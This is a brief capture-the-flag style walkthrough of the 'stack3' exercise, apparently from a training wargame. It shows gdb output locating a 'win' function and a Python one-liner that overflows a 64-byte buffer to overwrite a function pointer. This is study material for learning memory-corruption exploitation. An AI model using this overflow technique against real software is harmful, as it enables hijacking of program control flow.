#### Stack3

This program makes a pointer to a function, you need to modidy the pointer to access the function.
The function address is known from gdb.
```bash
gdb stack3
(gdb) info functions
...
File stack3/stack3.c:
int main(int, char **);
void win(void);
...

(gdb) disas win
Dump of assembler code for function win:
0x08048424 <win+0>:	push   %ebp
...
```
---

The start function addres is 0x08048424, so as always, fill the buffer with characters and the access to the pointer and modify it to enter in the function.

```bash
echo `python -c 'print("X"*64 + "\x24\x84\x04\x08")'` | ./stack3
``` 
